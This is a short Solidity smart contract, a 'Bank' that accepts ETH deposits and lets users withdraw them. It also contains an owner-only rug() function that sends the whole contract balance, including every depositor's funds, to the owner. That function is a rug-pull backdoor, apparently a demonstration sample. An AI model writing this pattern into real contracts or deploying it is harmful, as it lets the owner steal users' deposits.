// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract Bank {
    address public owner;
    mapping(address => uint) public balances;

    constructor(){
        owner = msg.sender;
    }

    receive() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint amount) public {
        balances[msg.sender] -= amount;
        safeTransferETH(msg.sender, amount);
    }

    function rug() external onlyOwner {
        safeTransferETH(owner, address(this).balance);
    }

    modifier onlyOwner(){
        require(msg.sender == owner, "this function is restricted to the owner");
        _;
        // will be replaced by the code of the function
    }

    function safeTransferETH(address to, uint256 value) internal {
        (bool success,) = to.call{value : value}(new bytes(0));
        require(success, 'TransferHelper::safeTransferETH: ETH transfer failed');
    }
}